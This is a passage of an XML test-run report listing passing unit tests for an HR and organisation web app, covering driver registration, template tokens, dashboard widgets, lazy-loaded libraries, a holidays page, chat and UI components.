    </testcase>
    <testcase classname="drivers.revokeCalendarAccess revokes access for owner caller" name="drivers.revokeCalendarAccess revokes access for owner caller" time="0.001">
    </testcase>
    <testcase classname="drivers.revokeCalendarAccess handles access not found gracefully (no patch)" name="drivers.revokeCalendarAccess handles access not found gracefully (no patch)" time="0.001">
    </testcase>
    <testcase classname="drivers.requestCalendarAccess rejects unauthenticated caller" name="drivers.requestCalendarAccess rejects unauthenticated caller" time="0.001">
    </testcase>
    <testcase classname="drivers.requestCalendarAccess sends notification to driver" name="drivers.requestCalendarAccess sends notification to driver" time="0.001">
    </testcase>
    <testcase classname="drivers.registerAsDriver rejects unauthenticated caller" name="drivers.registerAsDriver rejects unauthenticated caller" time="0.006">
    </testcase>
    <testcase classname="drivers.registerAsDriver rejects non-admin, non-self registration" name="drivers.registerAsDriver rejects non-admin, non-self registration" time="0.001">
    </testcase>
    <testcase classname="drivers.registerAsDriver allows admin to register another user as driver" name="drivers.registerAsDriver allows admin to register another user as driver" time="0.001">
    </testcase>
    <testcase classname="drivers.registerAsDriver allows self-registration" name="drivers.registerAsDriver allows self-registration" time="0.001">
    </testcase>
    <testcase classname="drivers.registerAsDriver rejects cross-org registration" name="drivers.registerAsDriver rejects cross-org registration" time="0.001">
    </testcase>
    <testcase classname="drivers.registerAsDriver updates existing driver record on re-registration" name="drivers.registerAsDriver updates existing driver record on re-registration" time="0.002">
    </testcase>
    <testcase classname="drivers.updateDriverAvailability rejects unauthenticated caller" name="drivers.updateDriverAvailability rejects unauthenticated caller" time="0.002">
    </testcase>
    <testcase classname="drivers.updateDriverAvailability rejects non-driver, non-admin caller" name="drivers.updateDriverAvailability rejects non-driver, non-admin caller" time="0.001">
    </testcase>
    <testcase classname="drivers.updateDriverAvailability allows driver to update own availability" name="drivers.updateDriverAvailability allows driver to update own availability" time="0.002">
    </testcase>
    <testcase classname="drivers.updateDriverAvailability allows admin to update any driver availability" name="drivers.updateDriverAvailability allows admin to update any driver availability" time="0.001">
    </testcase>
    <testcase classname="drivers.addFavoriteDriver rejects unauthenticated caller" name="drivers.addFavoriteDriver rejects unauthenticated caller" time="0.001">
    </testcase>
    <testcase classname="drivers.addFavoriteDriver adds favorite for caller" name="drivers.addFavoriteDriver adds favorite for caller" time="0.001">
    </testcase>
    <testcase classname="drivers.addFavoriteDriver returns existing favorite id instead of creating duplicate" name="drivers.addFavoriteDriver returns existing favorite id instead of creating duplicate" time="0.002">
    </testcase>
    <testcase classname="drivers.removeFavoriteDriver rejects unauthenticated caller" name="drivers.removeFavoriteDriver rejects unauthenticated caller" time="0.001">
    </testcase>
    <testcase classname="drivers.removeFavoriteDriver removes favorite for caller" name="drivers.removeFavoriteDriver removes favorite for caller" time="0.001">
    </testcase>
  </testsuite>
  <testsuite name="AVAILABLE_TOKENS" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:22:44" time="5.192" tests="41">
    <testcase classname="AVAILABLE_TOKENS contains all expected token keys" name="AVAILABLE_TOKENS contains all expected token keys" time="0.003">
    </testcase>
    <testcase classname="AVAILABLE_TOKENS matches TOKEN_RESOLVERS keys" name="AVAILABLE_TOKENS matches TOKEN_RESOLVERS keys" time="0.003">
    </testcase>
    <testcase classname="AVAILABLE_TOKENS contains no duplicates" name="AVAILABLE_TOKENS contains no duplicates" time="0.001">
    </testcase>
    <testcase classname="TOKEN_RESOLVERS resolves employee.fullName to employee name" name="TOKEN_RESOLVERS resolves employee.fullName to employee name" time="0.001">
    </testcase>
    <testcase classname="TOKEN_RESOLVERS resolves employee.email to employee email" name="TOKEN_RESOLVERS resolves employee.email to employee email" time="0">
    </testcase>
    <testcase classname="TOKEN_RESOLVERS resolves org.name to organization name" name="TOKEN_RESOLVERS resolves org.name to organization name" time="0">
    </testcase>
    <testcase classname="TOKEN_RESOLVERS resolves signatory.name to signatory name" name="TOKEN_RESOLVERS resolves signatory.name to signatory name" time="0.001">
    </testcase>
    <testcase classname="TOKEN_RESOLVERS resolves today to current date" name="TOKEN_RESOLVERS resolves today to current date" time="0.004">
    </testcase>
    <testcase classname="TOKEN_RESOLVERS uses MISSING placeholder for null values" name="TOKEN_RESOLVERS uses MISSING placeholder for null values" time="0.001">
    </testcase>
    <testcase classname="TOKEN_RESOLVERS formats salary with currency" name="TOKEN_RESOLVERS formats salary with currency" time="0.059">
    </testcase>
    <testcase classname="TOKEN_RESOLVERS returns MISSING for salary when baseSalary is null" name="TOKEN_RESOLVERS returns MISSING for salary when baseSalary is null" time="0">
    </testcase>
    <testcase classname="resolveTokens replaces single token with its resolved value" name="resolveTokens replaces single token with its resolved value" time="0.001">
    </testcase>
    <testcase classname="resolveTokens replaces multiple tokens in one string" name="resolveTokens replaces multiple tokens in one string" time="0">
    </testcase>
    <testcase classname="resolveTokens replaces the same token multiple times" name="resolveTokens replaces the same token multiple times" time="0">
    </testcase>
    <testcase classname="resolveTokens leaves unknown tokens untouched" name="resolveTokens leaves unknown tokens untouched" time="0.001">
    </testcase>
    <testcase classname="resolveTokens replaces {{today}} with formatted date" name="resolveTokens replaces {{today}} with formatted date" time="0.001">
    </testcase>
    <testcase classname="resolveTokens handles empty content string" name="resolveTokens handles empty content string" time="0.001">
    </testcase>
    <testcase classname="resolveTokens handles content with no tokens" name="resolveTokens handles content with no tokens" time="0">
    </testcase>
    <testcase classname="resolveTokens works with Russian locale" name="resolveTokens works with Russian locale" time="0.001">
    </testcase>
    <testcase classname="resolveTokens handles tokens with whitespace inside braces" name="resolveTokens handles tokens with whitespace inside braces" time="0.001">
    </testcase>
    <testcase classname="extractTokens finds known tokens in template" name="extractTokens finds known tokens in template" time="0.002">
    </testcase>
    <testcase classname="extractTokens finds unknown tokens in template" name="extractTokens finds unknown tokens in template" time="0.001">
    </testcase>
    <testcase classname="extractTokens finds mixed known and unknown tokens" name="extractTokens finds mixed known and unknown tokens" time="0.001">
    </testcase>
    <testcase classname="extractTokens returns empty arrays for content without tokens" name="extractTokens returns empty arrays for content without tokens" time="0.001">
    </testcase>
    <testcase classname="extractTokens returns empty arrays for empty content" name="extractTokens returns empty arrays for empty content" time="0.001">
    </testcase>
    <testcase classname="extractTokens deduplicates repeated tokens" name="extractTokens deduplicates repeated tokens" time="0">
    </testcase>
    <testcase classname="extractTokens finds all known tokens from the catalog templates" name="extractTokens finds all known tokens from the catalog templates" time="0.001">
    </testcase>
    <testcase classname="TOKEN_RESOLVERS - all employee tokens resolves employee.fullName to John Doe" name="TOKEN_RESOLVERS - all employee tokens resolves employee.fullName to John Doe" time="0.001">
    </testcase>
    <testcase classname="TOKEN_RESOLVERS - all employee tokens resolves employee.email to john@example.com" name="TOKEN_RESOLVERS - all employee tokens resolves employee.email to john@example.com" time="0.001">
    </testcase>
    <testcase classname="TOKEN_RESOLVERS - all employee tokens resolves employee.phone to +374 10 123456" name="TOKEN_RESOLVERS - all employee tokens resolves employee.phone to +374 10 123456" time="0">
    </testcase>
    <testcase classname="TOKEN_RESOLVERS - all employee tokens resolves employee.department to Engineering" name="TOKEN_RESOLVERS - all employee tokens resolves employee.department to Engineering" time="0">
    </testcase>
    <testcase classname="TOKEN_RESOLVERS - all employee tokens resolves employee.position to Senior Developer" name="TOKEN_RESOLVERS - all employee tokens resolves employee.position to Senior Developer" time="0.001">
    </testcase>
    <testcase classname="TOKEN_RESOLVERS - all employee tokens resolves employee.location to Yerevan" name="TOKEN_RESOLVERS - all employee tokens resolves employee.location to Yerevan" time="0">
    </testcase>
    <testcase classname="TOKEN_RESOLVERS - null handling returns MISSING for all null tokens" name="TOKEN_RESOLVERS - null handling returns MISSING for all null tokens" time="0.007">
    </testcase>
    <testcase classname="resolveTokens - template patterns resolves &quot;{{employee.fullName}}&quot; to &quot;John Doe&quot;" name="resolveTokens - template patterns resolves &quot;{{employee.fullName}}&quot; to &quot;John Doe&quot;" time="0.001">
    </testcase>
    <testcase classname="resolveTokens - template patterns resolves &quot;{{employee.fullName}} - {{employee.position}}&quot; to &quot;John Doe - Senior Developer&quot;" name="resolveTokens - template patterns resolves &quot;{{employee.fullName}} - {{employee.position}}&quot; to &quot;John Doe - Senior Developer&quot;" time="0.001">
    </testcase>
    <testcase classname="resolveTokens - template patterns resolves &quot;{{org.name}}: {{employee.department}}&quot; to &quot;Strata: Engineering&quot;" name="resolveTokens - template patterns resolves &quot;{{org.name}}: {{employee.department}}&quot; to &quot;Strata: Engineering&quot;" time="0.001">
    </testcase>
    <testcase classname="resolveTokens - all locales works with locale en" name="resolveTokens - all locales works with locale en" time="0.002">
    </testcase>
    <testcase classname="resolveTokens - all locales works with locale ru" name="resolveTokens - all locales works with locale ru" time="0.001">
    </testcase>
    <testcase classname="resolveTokens - all locales works with locale hy" name="resolveTokens - all locales works with locale hy" time="0.001">
    </testcase>
    <testcase classname="resolveTokens - all locales works with locale de" name="resolveTokens - all locales works with locale de" time="0.001">
    </testcase>
  </testsuite>
  <testsuite name="dashboard.getMyTasks" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:22:46" time="3.02" tests="24">
    <testcase classname="dashboard.getMyTasks returns empty when caller is unauthenticated" name="dashboard.getMyTasks returns empty when caller is unauthenticated" time="0.004">
    </testcase>
    <testcase classname="dashboard.getMyTasks returns tasks sorted by deadline (soonest first)" name="dashboard.getMyTasks returns tasks sorted by deadline (soonest first)" time="0.002">
    </testcase>
    <testcase classname="dashboard.getMyTasks puts undated tasks after dated ones" name="dashboard.getMyTasks puts undated tasks after dated ones" time="0.001">
    </testcase>
    <testcase classname="dashboard.getMyTasks shows superadmin tasks from any org" name="dashboard.getMyTasks shows superadmin tasks from any org" time="0.001">
    </testcase>
    <testcase classname="dashboard.getMyTasks filters cross-org tasks for non-superadmin" name="dashboard.getMyTasks filters cross-org tasks for non-superadmin" time="0.001">
    </testcase>
    <testcase classname="dashboard.getMyTasks returns empty when no active tasks" name="dashboard.getMyTasks returns empty when no active tasks" time="0">
    </testcase>
    <testcase classname="dashboard.getMyTasks maps task to minimal shape" name="dashboard.getMyTasks maps task to minimal shape" time="0.003">
    </testcase>
    <testcase classname="dashboard.getUpcomingBirthdays returns empty when caller is unauthenticated" name="dashboard.getUpcomingBirthdays returns empty when caller is unauthenticated" time="0.001">
    </testcase>
    <testcase classname="dashboard.getUpcomingBirthdays returns empty when caller has no organizationId" name="dashboard.getUpcomingBirthdays returns empty when caller has no organizationId" time="0.008">
    </testcase>
    <testcase classname="dashboard.getUpcomingBirthdays returns birthdays within default 30 days" name="dashboard.getUpcomingBirthdays returns birthdays within default 30 days" time="0.002">
    </testcase>
    <testcase classname="dashboard.getUpcomingBirthdays returns empty when no birthdays within window" name="dashboard.getUpcomingBirthdays returns empty when no birthdays within window" time="0.001">
    </testcase>
    <testcase classname="dashboard.getUpcomingBirthdays respects custom withinDays parameter" name="dashboard.getUpcomingBirthdays respects custom withinDays parameter" time="0">
    </testcase>
    <testcase classname="dashboard.getUpcomingBirthdays rolls birthday to next year when already passed" name="dashboard.getUpcomingBirthdays rolls birthday to next year when already passed" time="0.001">
    </testcase>
    <testcase classname="dashboard.getUpcomingBirthdays falls back to profile dateOfBirth" name="dashboard.getUpcomingBirthdays falls back to profile dateOfBirth" time="0">
    </testcase>
    <testcase classname="dashboard.getUpcomingBirthdays skips users with no dateOfBirth at all" name="dashboard.getUpcomingBirthdays skips users with no dateOfBirth at all" time="0.001">
    </testcase>
    <testcase classname="dashboard.getUpcomingBirthdays sorts birthdays by soonest first" name="dashboard.getUpcomingBirthdays sorts birthdays by soonest first" time="0.001">
    </testcase>
    <testcase classname="dashboard.getOutOfOffice returns empty when caller is unauthenticated" name="dashboard.getOutOfOffice returns empty when caller is unauthenticated" time="0.002">
    </testcase>
    <testcase classname="dashboard.getOutOfOffice returns empty when caller has no organizationId" name="dashboard.getOutOfOffice returns empty when caller has no organizationId" time="0">
    </testcase>
    <testcase classname="dashboard.getOutOfOffice returns leaves overlapping the window" name="dashboard.getOutOfOffice returns leaves overlapping the window" time="0.003">
    </testcase>
    <testcase classname="dashboard.getOutOfOffice returns empty when no leaves in window" name="dashboard.getOutOfOffice returns empty when no leaves in window" time="0.002">
    </testcase>
    <testcase classname="dashboard.getOutOfOffice handles overlapping leave with enrichment" name="dashboard.getOutOfOffice handles overlapping leave with enrichment" time="0.001">
    </testcase>
    <testcase classname="dashboard.getOutOfOffice enriches with user profile data" name="dashboard.getOutOfOffice enriches with user profile data" time="0.001">
    </testcase>
    <testcase classname="dashboard.getOutOfOffice sorts results by startDate ascending" name="dashboard.getOutOfOffice sorts results by startDate ascending" time="0.004">
    </testcase>
    <testcase classname="dashboard.getOutOfOffice marks isOutToday correctly" name="dashboard.getOutOfOffice marks isOutToday correctly" time="0.001">
    </testcase>
  </testsuite>
  <testsuite name="recharts dynamic components" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:22:43" time="6.058" tests="59">
    <testcase classname="recharts dynamic components LineChart is defined" name="recharts dynamic components LineChart is defined" time="0.002">
    </testcase>
    <testcase classname="recharts dynamic components BarChart is defined" name="recharts dynamic components BarChart is defined" time="0.001">
    </testcase>
    <testcase classname="recharts dynamic components PieChart is defined" name="recharts dynamic components PieChart is defined" time="0">
    </testcase>
    <testcase classname="recharts dynamic components AreaChart is defined" name="recharts dynamic components AreaChart is defined" time="0.001">
    </testcase>
    <testcase classname="recharts dynamic components Line is defined" name="recharts dynamic components Line is defined" time="0.001">
    </testcase>
    <testcase classname="recharts dynamic components Bar is defined" name="recharts dynamic components Bar is defined" time="0">
    </testcase>
    <testcase classname="recharts dynamic components Pie is defined" name="recharts dynamic components Pie is defined" time="0">
    </testcase>
    <testcase classname="recharts dynamic components Cell is defined" name="recharts dynamic components Cell is defined" time="0.003">
    </testcase>
    <testcase classname="recharts dynamic components XAxis is defined" name="recharts dynamic components XAxis is defined" time="0">
    </testcase>
    <testcase classname="recharts dynamic components YAxis is defined" name="recharts dynamic components YAxis is defined" time="0.001">
    </testcase>
    <testcase classname="recharts dynamic components CartesianGrid is defined" name="recharts dynamic components CartesianGrid is defined" time="0">
    </testcase>
    <testcase classname="recharts dynamic components Tooltip is defined" name="recharts dynamic components Tooltip is defined" time="0.001">
    </testcase>
    <testcase classname="recharts dynamic components Legend is defined" name="recharts dynamic components Legend is defined" time="0">
    </testcase>
    <testcase classname="recharts dynamic components ResponsiveContainer is defined" name="recharts dynamic components ResponsiveContainer is defined" time="0">
    </testcase>
    <testcase classname="recharts dynamic components Area is defined" name="recharts dynamic components Area is defined" time="0">
    </testcase>
    <testcase classname="three.js / fiber dynamic imports Canvas is defined" name="three.js / fiber dynamic imports Canvas is defined" time="0.001">
    </testcase>
    <testcase classname="three.js / fiber dynamic imports loadThree returns a promise" name="three.js / fiber dynamic imports loadThree returns a promise" time="0.093">
    </testcase>
    <testcase classname="three.js / fiber dynamic imports loadUseFrame returns a promise" name="three.js / fiber dynamic imports loadUseFrame returns a promise" time="0.154">
    </testcase>
    <testcase classname="PDF / Excel / DOCX lazy loaders loadPdfMake returns a promise" name="PDF / Excel / DOCX lazy loaders loadPdfMake returns a promise" time="0.283">
    </testcase>
    <testcase classname="PDF / Excel / DOCX lazy loaders loadExcelJS returns a promise" name="PDF / Excel / DOCX lazy loaders loadExcelJS returns a promise" time="2.448">
    </testcase>
    <testcase classname="PDF / Excel / DOCX lazy loaders loadDocx returns a promise" name="PDF / Excel / DOCX lazy loaders loadDocx returns a promise" time="0.085">
    </testcase>
    <testcase classname="leaflet dynamic imports loadLeaflet returns a promise" name="leaflet dynamic imports loadLeaflet returns a promise" time="0.047">
    </testcase>
    <testcase classname="leaflet dynamic imports MapContainer is defined" name="leaflet dynamic imports MapContainer is defined" time="0.001">
    </testcase>
    <testcase classname="leaflet dynamic imports TileLayer is defined" name="leaflet dynamic imports TileLayer is defined" time="0.001">
    </testcase>
    <testcase classname="leaflet dynamic imports Marker is defined" name="leaflet dynamic imports Marker is defined" time="0">
    </testcase>
    <testcase classname="leaflet dynamic imports Popup is defined" name="leaflet dynamic imports Popup is defined" time="0">
    </testcase>
    <testcase classname="face-api and QR code lazy loaders loadFaceApi returns a promise" name="face-api and QR code lazy loaders loadFaceApi returns a promise" time="0.025">
    </testcase>
    <testcase classname="face-api and QR code lazy loaders loadQRCode returns a promise" name="face-api and QR code lazy loaders loadQRCode returns a promise" time="0.235">
    </testcase>
    <testcase classname="face-api and QR code lazy loaders loadQRCode returns default export" name="face-api and QR code lazy loaders loadQRCode returns default export" time="0.001">
    </testcase>
    <testcase classname="default export includes all recharts components" name="default export includes all recharts components" time="0.001">
    </testcase>
    <testcase classname="default export includes three.js and leaflet components" name="default export includes three.js and leaflet components" time="0.002">
    </testcase>
    <testcase classname="default export includes lazy loader functions" name="default export includes lazy loader functions" time="0.001">
    </testcase>
    <testcase classname="loading placeholders recharts charts render a loading placeholder with animate-pulse class" name="loading placeholders recharts charts render a loading placeholder with animate-pulse class" time="0.015">
    </testcase>
    <testcase classname="loading placeholders recharts chart loading placeholder has height h-64" name="loading placeholders recharts chart loading placeholder has height h-64" time="0.004">
    </testcase>
    <testcase classname="loading placeholders PieChart renders loading placeholder" name="loading placeholders PieChart renders loading placeholder" time="0.004">
    </testcase>
    <testcase classname="loading placeholders AreaChart renders loading placeholder" name="loading placeholders AreaChart renders loading placeholder" time="0.02">
    </testcase>
    <testcase classname="loading placeholders Canvas renders loading placeholder with h-96" name="loading placeholders Canvas renders loading placeholder with h-96" time="0.005">
    </testcase>
    <testcase classname="loading placeholders MapContainer renders loading placeholder with h-96" name="loading placeholders MapContainer renders loading placeholder with h-96" time="0.004">
    </testcase>
    <testcase classname="loading placeholders components without loading prop render null" name="loading placeholders components without loading prop render null" time="0.003">
    </testcase>
    <testcase classname="loading placeholders Bar without loading renders null" name="loading placeholders Bar without loading renders null" time="0.004">
    </testcase>
    <testcase classname="loading placeholders Pie without loading renders null" name="loading placeholders Pie without loading renders null" time="0.003">
    </testcase>
    <testcase classname="loading placeholders Cell renders null (no loading specified)" name="loading placeholders Cell renders null (no loading specified)" time="0.005">
    </testcase>
    <testcase classname="loading placeholders XAxis renders null (no loading specified)" name="loading placeholders XAxis renders null (no loading specified)" time="0.003">
    </testcase>
    <testcase classname="loading placeholders YAxis renders null (no loading specified)" name="loading placeholders YAxis renders null (no loading specified)" time="0.003">
    </testcase>
    <testcase classname="loading placeholders CartesianGrid renders null (no loading specified)" name="loading placeholders CartesianGrid renders null (no loading specified)" time="0.003">
    </testcase>
    <testcase classname="loading placeholders Tooltip renders null (no loading specified)" name="loading placeholders Tooltip renders null (no loading specified)" time="0.002">
    </testcase>
    <testcase classname="loading placeholders Legend renders null (no loading specified)" name="loading placeholders Legend renders null (no loading specified)" time="0.003">
    </testcase>
    <testcase classname="loading placeholders ResponsiveContainer renders null (no loading specified)" name="loading placeholders ResponsiveContainer renders null (no loading specified)" time="0.006">
    </testcase>
    <testcase classname="loading placeholders Area renders null (no loading specified)" name="loading placeholders Area renders null (no loading specified)" time="0.004">
    </testcase>
    <testcase classname="loading placeholders TileLayer renders null (no loading specified)" name="loading placeholders TileLayer renders null (no loading specified)" time="0.003">
    </testcase>
    <testcase classname="loading placeholders Marker renders null (no loading specified)" name="loading placeholders Marker renders null (no loading specified)" time="0.005">
    </testcase>
    <testcase classname="loading placeholders Popup renders null (no loading specified)" name="loading placeholders Popup renders null (no loading specified)" time="0.016">
    </testcase>
    <testcase classname="dynamic() options all chart components use ssr:false" name="dynamic() options all chart components use ssr:false" time="0.001">
    </testcase>
    <testcase classname="dynamic() options components with loading placeholder have ssr:false" name="dynamic() options components with loading placeholder have ssr:false" time="0.002">
    </testcase>
    <testcase classname="dynamic() options loadThree is NOT a dynamic component (plain function)" name="dynamic() options loadThree is NOT a dynamic component (plain function)" time="0.001">
    </testcase>
    <testcase classname="dynamic() options loadUseFrame is a plain function" name="dynamic() options loadUseFrame is a plain function" time="0.001">
    </testcase>
    <testcase classname="lazy loader proxy functions loadDocx calls import(&quot;docx&quot;) dynamically" name="lazy loader proxy functions loadDocx calls import(&quot;docx&quot;) dynamically" time="0.002">
    </testcase>
    <testcase classname="lazy loader proxy functions loadLeaflet attempts to import leaflet" name="lazy loader proxy functions loadLeaflet attempts to import leaflet" time="0.002">
    </testcase>
    <testcase classname="lazy loader proxy functions loadPdfMake returns a promise that resolves to a module" name="lazy loader proxy functions loadPdfMake returns a promise that resolves to a module" time="0.001">
    </testcase>
  </testsuite>
  <testsuite name="HolidaysPage" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:22:48" time="2.561" tests="18">
    <testcase classname="HolidaysPage renders the page title" name="HolidaysPage renders the page title" time="0.069">
    </testcase>
    <testcase classname="HolidaysPage renders the subtitle" name="HolidaysPage renders the subtitle" time="0.026">
    </testcase>
    <testcase classname="HolidaysPage shows add holiday button" name="HolidaysPage shows add holiday button" time="0.038">
    </testcase>
    <testcase classname="HolidaysPage renders public holidays in their section" name="HolidaysPage renders public holidays in their section" time="0.028">
    </testcase>
    <testcase classname="HolidaysPage renders internal holidays in their section" name="HolidaysPage renders internal holidays in their section" time="0.037">
    </testcase>
    <testcase classname="HolidaysPage shows ShieldLoader when no user" name="HolidaysPage shows ShieldLoader when no user" time="0.021">
    </testcase>
    <testcase classname="HolidaysPage opens create dialog on add button click" name="HolidaysPage opens create dialog on add button click" time="0.207">
    </testcase>
    <testcase classname="HolidaysPage shows recurring badge for recurring holidays" name="HolidaysPage shows recurring badge for recurring holidays" time="0.025">
    </testcase>
    <testcase classname="HolidaysPage shows holiday names in the list" name="HolidaysPage shows holiday names in the list" time="0.027">
    </testcase>
    <testcase classname="HolidaysPage shows empty state when no public holidays" name="HolidaysPage shows empty state when no public holidays" time="0.016">
    </testcase>
    <testcase classname="HolidaysPage shows empty state when no internal holidays" name="HolidaysPage shows empty state when no internal holidays" time="0.02">
    </testcase>
    <testcase classname="HolidaysPage opens edit dialog with pre-filled data on edit click" name="HolidaysPage opens edit dialog with pre-filled data on edit click" time="0.185">
    </testcase>
    <testcase classname="HolidaysPage shows form fields in create dialog" name="HolidaysPage shows form fields in create dialog" time="0.058">
    </testcase>
    <testcase classname="HolidaysPage calls createHoliday mutation when submitting create form" name="HolidaysPage calls createHoliday mutation when submitting create form" time="0.145">
    </testcase>
    <testcase classname="HolidaysPage shows cancel button in dialog" name="HolidaysPage shows cancel button in dialog" time="0.048">
    </testcase>
    <testcase classname="HolidaysPage shows save button in edit dialog" name="HolidaysPage shows save button in edit dialog" time="0.048">
    </testcase>
    <testcase classname="HolidaysPage renders public holiday emoji icon" name="HolidaysPage renders public holiday emoji icon" time="0.019">
    </testcase>
    <testcase classname="HolidaysPage renders internal holiday emoji icon" name="HolidaysPage renders internal holiday emoji icon" time="0.021">
    </testcase>
  </testsuite>
  <testsuite name="ChatClient" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:22:48" time="2.33" tests="16">
    <testcase classname="ChatClient Loading state shows loader when userId is empty" name="ChatClient Loading state shows loader when userId is empty" time="0.02">
    </testcase>
    <testcase classname="ChatClient Empty state renders empty state when no conversation selected" name="ChatClient Empty state renders empty state when no conversation selected" time="0.041">
    </testcase>
    <testcase classname="ChatClient Empty state renders start conversation button in empty state" name="ChatClient Empty state renders start conversation button in empty state" time="0.016">
    </testcase>
    <testcase classname="ChatClient Empty state opens new conversation modal from empty state button" name="ChatClient Empty state opens new conversation modal from empty state button" time="0.024">
    </testcase>
    <testcase classname="ChatClient Conversation list renders conversation list with correct count" name="ChatClient Conversation list renders conversation list with correct count" time="0.012">
    </testcase>
    <testcase classname="ChatClient Conversation list renders conversation names" name="ChatClient Conversation list renders conversation names" time="0.016">
    </testcase>
    <testcase classname="ChatClient Conversation list selects conversation when clicked" name="ChatClient Conversation list selects conversation when clicked" time="0.021">
    </testcase>
    <testcase classname="ChatClient Conversation list opens new conversation modal" name="ChatClient Conversation list opens new conversation modal" time="0.022">
    </testcase>
    <testcase classname="ChatClient Conversation list creates conversation from modal and shows chat window" name="ChatClient Conversation list creates conversation from modal and shows chat window" time="0.023">
    </testcase>
    <testcase classname="ChatClient Conversation list closes new conversation modal" name="ChatClient Conversation list closes new conversation modal" time="0.023">
    </testcase>
    <testcase classname="ChatClient Chat window navigates back from chat window and shows empty state" name="ChatClient Chat window navigates back from chat window and shows empty state" time="0.338">
    </testcase>
    <testcase classname="ChatClient Call functionality initiates a call and shows call modal" name="ChatClient Call functionality initiates a call and shows call modal" time="0.05">
    </testcase>
    <testcase classname="ChatClient Call functionality shows audio call type in modal" name="ChatClient Call functionality shows audio call type in modal" time="0.036">
    </testcase>
    <testcase classname="ChatClient Call functionality ends a call and hides call modal" name="ChatClient Call functionality ends a call and hides call modal" time="0.043">
    </testcase>
    <testcase classname="ChatClient Conversation actions calls mutation on pin" name="ChatClient Conversation actions calls mutation on pin" time="0.01">
    </testcase>
    <testcase classname="ChatClient Conversation actions calls mutation on delete" name="ChatClient Conversation actions calls mutation on delete" time="0.012">
    </testcase>
  </testsuite>
  <testsuite name="useMaintenanceAutoLogout" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:22:47" time="4.716" tests="5">
    <testcase classname="useMaintenanceAutoLogout does nothing when maintenance is not active" name="useMaintenanceAutoLogout does nothing when maintenance is not active" time="0.069">
    </testcase>
    <testcase classname="useMaintenanceAutoLogout does nothing for superadmin role even if maintenance is active" name="useMaintenanceAutoLogout does nothing for superadmin role even if maintenance is active" time="0.034">
    </testcase>
    <testcase classname="useMaintenanceAutoLogout triggers logout immediately when maintenance start time is in the past" name="useMaintenanceAutoLogout triggers logout immediately when maintenance start time is in the past" time="0.046">
    </testcase>
    <testcase classname="useMaintenanceAutoLogout schedules logout for future maintenance start time" name="useMaintenanceAutoLogout schedules logout for future maintenance start time" time="0.02">
    </testcase>
    <testcase classname="useMaintenanceAutoLogout cleans up timeout on unmount" name="useMaintenanceAutoLogout cleans up timeout on unmount" time="0.011">
    </testcase>
  </testsuite>
  <testsuite name="Button" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:22:49" time="2.326" tests="64">
    <testcase classname="Button renders children text" name="Button renders children text" time="0.034">
    </testcase>
    <testcase classname="Button applies variant and size data attributes" name="Button applies variant and size data attributes" time="0.007">
    </testcase>
    <testcase classname="Button handles click events" name="Button handles click events" time="0.025">
    </testcase>
    <testcase classname="Button is disabled when disabled prop is set" name="Button is disabled when disabled prop is set" time="0.004">
    </testcase>
    <testcase classname="Button applies custom className" name="Button applies custom className" time="0.005">
    </testcase>
    <testcase classname="Button renders as child element when asChild is true" name="Button renders as child element when asChild is true" time="0.009">
    </testcase>
    <testcase classname="Button uses default variant when not specified" name="Button uses default variant when not specified" time="0.004">
    </testcase>
    <testcase classname="Button uses default size when not specified" name="Button uses default size when not specified" time="0.005">
    </testcase>
    <testcase classname="Button renders as button element by default" name="Button renders as button element by default" time="0.003">
    </testcase>
    <testcase classname="Button has ripple-effect class" name="Button has ripple-effect class" time="0.004">
    </testcase>
    <testcase classname="buttonVariants returns class string for default variant" name="buttonVariants returns class string for default variant" time="0.001">
    </testcase>
    <testcase classname="buttonVariants returns class string for outline variant" name="buttonVariants returns class string for outline variant" time="0.001">
    </testcase>
    <testcase classname="buttonVariants returns class string for ghost variant" name="buttonVariants returns class string for ghost variant" time="0.001">
    </testcase>
    <testcase classname="buttonVariants handles size sm" name="buttonVariants handles size sm" time="0.001">
    </testcase>
    <testcase classname="buttonVariants handles size xl" name="buttonVariants handles size xl" time="0.001">
    </testcase>
    <testcase classname="buttonVariants handles icon size" name="buttonVariants handles icon size" time="0">
    </testcase>
    <testcase classname="buttonVariants combines variant and size" name="buttonVariants combines variant and size" time="0">
    </testcase>
    <testcase classname="Badge renders children text" name="Badge renders children text" time="0.005">
    </testcase>
    <testcase classname="Badge renders as span element" name="Badge renders as span element" time="0.004">
    </testcase>
    <testcase classname="Badge accepts variant prop" name="Badge accepts variant prop" time="0.004">
    </testcase>
    <testcase classname="Badge applies custom className" name="Badge applies custom className" time="0.006">
    </testcase>
    <testcase classname="Badge uses default variant when not specified" name="Badge uses default variant when not specified" time="0.004">
    </testcase>
    <testcase classname="badgeVariants returns classes for secondary variant" name="badgeVariants returns classes for secondary variant" time="0.001">
    </testcase>
    <testcase classname="badgeVariants returns classes for outline variant" name="badgeVariants returns classes for outline variant" time="0.001">
    </testcase>
    <testcase classname="Card renders children" name="Card renders children" time="0.004">
    </testcase>
    <testcase classname="Card renders as div" name="Card renders as div" time="0.004">
    </testcase>
    <testcase classname="Card applies elevated variant styles" name="Card applies elevated variant styles" time="0.005">
    </testcase>
    <testcase classname="CardHeader renders children" name="CardHeader renders children" time="0.004">
    </testcase>
    <testcase classname="CardTitle renders as h3 by default" name="CardTitle renders as h3 by default" time="0.005">
    </testcase>
    <testcase classname="CardTitle renders as specified heading tag" name="CardTitle renders as specified heading tag" time="0.004">
    </testcase>
    <testcase classname="CardDescription renders description text" name="CardDescription renders description text" time="0.003">
    </testcase>
    <testcase classname="CardContent renders content" name="CardContent renders content" time="0.003">
    </testcase>
    <testcase classname="CardFooter renders footer" name="CardFooter renders footer" time="0.006">
    </testcase>
    <testcase classname="Skeleton renders with default props" name="Skeleton renders with default props" time="0.005">
    </testcase>
    <testcase classname="Skeleton applies variant classes" name="Skeleton applies variant classes" time="0.009">
    </testcase>
    <testcase classname="Skeleton applies width and height as style" name="Skeleton applies width and height as style" time="0.003">
    </testcase>
    <testcase classname="Skeleton applies custom className" name="Skeleton applies custom className" time="0.003">
    </testcase>
    <testcase classname="Skeleton allows disabling animation" name="Skeleton allows disabling animation" time="0.003">
    </testcase>
    <testcase classname="Skeleton handles string width/height" name="Skeleton handles string width/height" time="0.004">
    </testcase>
    <testcase classname="SkeletonText renders specified number of lines" name="SkeletonText renders specified number of lines" time="0.013">
